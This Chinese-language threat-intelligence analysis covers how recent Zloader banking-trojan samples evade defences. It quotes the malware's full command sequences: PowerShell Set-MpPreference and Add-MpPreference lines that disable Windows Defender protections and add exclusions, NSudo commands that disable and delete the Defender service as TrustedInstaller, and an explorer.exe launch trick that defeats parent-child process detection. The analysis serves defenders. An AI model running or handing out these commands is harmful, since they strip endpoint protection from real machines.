## **情报背景**

Zloader于2016年被首次发现，是臭名昭著的银行木马Zeus的一个分支，且仍在积极开发与快速迭代中。近期Zloader样本通过禁用Windows
Defender实现防御削弱，并依靠一种LOLBAS技术进行检测规避，本文将围绕这两方面进行阐述与分析。

 **战术标签**

|

防御规避  
  
---|---  
  
 **技术标签**

|

防御削弱 LOLBAS滥用  
  
 **情报来源**

|

https://www.sentinelone.com/labs/hide-and-seek-new-zloader-infection-chain-comes-with-improved-stealth-and-evasion-mechanisms/  
  
## 攻击技术分析

Zloader整体感染链如下所示：

![1638351575_61a742d72f47c973fea19.png!small?1638351577771](https://image.3001.net/images/20211201/1638351575_61a742d72f47c973fea19.png!small?1638351577771)

###  **亮点一：防御削弱-通过命令禁用Defender功能**

Zloader通过调用一系列Set-MpPreference
powershell命令实现Defender的相关组件的禁用，并将特定的组件与后缀排除在Windows Defender拦截名单之外，以便后续载荷的执行：

Windows Defender功能削弱

    
    
    # 关闭实时保护powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"  
      
    # 关闭行为监视  
    powershell.exe -command "Set-MpPreference -DisableBehaviorMonitoring $true"  
      
    # 禁用IOAV保护，禁止扫描下载的文件和附件  
    powershell.exe -command "Set-MpPreference -DisableIOAVProtection $true"  
      
    # 关闭Defender自动更新  
    powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"  
      
    # 禁止扫描.zip等的存档文件  
    powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"  
      
    # 关闭已知漏洞利用防护  
    powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $true"

Defender威胁忽视

    
    
    # 禁止提交样本  
    powershell.exe -command "Set-MpPreference -SubmitSamplesConsent 2"  
      
    # 指定用于高级威胁的自动修复操作选项  
    powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"  
      
    # 指定用于中级威胁的自动修复操作选项  
    powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"  
      
    # 指定用于低级威胁的自动修复操作选项  
    powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"  
      
    # 指定用于严重威胁的自动修复操作选项  
    powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"

Defender检测扩展排除

    
    
    powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""

Defender检测进程排除

    
    
    powershell.exe -command "Add-MpPreference -ExclusionProcess "regsvr.32""  
      
    powershell.exe -command "Add-MpPreference -ExclusionProcess "regsvr.32*""  
      
    powershell.exe -command "Add-MpPreference -ExclusionProcess ".exe""  
      
    powershell.exe -command "Add-MpPreference -ExclusionProcess "iexplorer.exe""  
      
    powershell.exe -command "Add-MpPreference -ExclusionProcess "explorer.exe""  
      
    powershell.exe -command "Add-MpPreference -ExclusionProcess ".dll""  
      
    powershell.exe -command "Add-MpPreference -ExclusionProcess "*.dll""  
      
    powershell.exe -command "Add-MpPreference -ExclusionProcess "*.exe""

禁止向微软报告安全信息

    
    
    cmd /c powershell.exe -command "Set-MpPreference -MAPSReporting 0"

保护关闭

    
    
    # PUA保护关闭  
    powershell.exe -command "Set-MpPreference -PUAProtection disable"

攻击面减少

    
    
    # 关闭受控文件夹访问  
    powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"

通过PowerShell cmdlet "Set-MpPreference"禁用了所有Windows Defender的模块，并通过"Add-MpPreference"将如regsvr.32和.exe、.dll等扩展加入了排除项，并对Windows
Defender隐藏了恶意软件的所有组件。这在很大程度上削弱了Windows Defender的防御能力，增强了样本在宿主上的隐匿效果。

###  **亮点二：防御削弱-利用开源工具Nsudo删除受保护的Defender服务**

最终被下载的有效载荷nsudo.bat中，通过COM接口进行权限提升，二次禁用Windows Defenfer服务。提权调用代码如下：

![1638351618_61a7430266540cdfb8619.png!small?1638351619237](https://image.3001.net/images/20211201/1638351618_61a7430266540cdfb8619.png!small?1638351619237)

  

Zloader滥用开源系统管理工具NSudo实现”TrustedInstaller”用户权限执行权限对Windows Defender服务进行禁用与删除。

    
    
    javase -U:T sc config WinDefend start= disabled
    javase -U:T -ShowWindowMode:Hide sc delete windefend

Windows Defender服务在系统中原本受到Protected Process
Light机制的保护，该机制通过在打开服务句柄时阻止某些访问权限（例如 SERVICE_CHANGE_CONFIG 和
SERVICE_STOP）来防止管理员禁用反恶意软件服务。但当用户令牌是TrustedInstaller用户或包含TrustedInstaller
SID作为其组成员之一（更常见），则绕过受保护的进程检查。该问题于2015年被报告，但可能由于攻击者需要拥有管理员权限才能成功滥用，微软并不认为这是一种安全问题，故并未得到修复。

###  **亮点三：利用LOLBAS命令绕过父子进程关系检测**

Zloader在本次攻击中，采用命令”explorer.exe
tim.exe”来执行其下一阶段的载荷，实际是一种已公开的以防御规避为目的的LOLBAS手段。这种执行方式保证了子进程创建时以新的explorer.exe进程作为父进程，避免存在进程间的父子关系。在一定程度上避免安全软件的怀疑，打破常规EDR对父子进程关系的检测，为下一阶段载荷的执行提供安全的环境。

在测试用例test.exe中以explorer.exe调用测试程序MsgBox.exe实现：

![1638351655_61a74327553a90bda8735.png!small?1638351656153](https://image.3001.net/images/20211201/1638351655_61a74327553a90bda8735.png!small?1638351656153)

  

进程树展示结果如下：

![1638351677_61a7433d1d91036f04910.png!small?1638351677919](https://image.3001.net/images/20211201/1638351677_61a7433d1d91036f04910.png!small?1638351677919)

可以看到，MsgBox.exe以独立进程而非test.exe的子进程存在。

## 总结

Zloader在本次攻击中利用Windows
Defender自带的管理命令及开源工具实现对其的防御削弱，并利用LOLBAS命令绕过针对父子进程关系的检测。这些更加复杂的防御规避手段，弱化了安全软件对其恶意行为的感知能力，暴露了一些安全机制被绕过滥用的风险，也给安全研究者带来了新的思考。

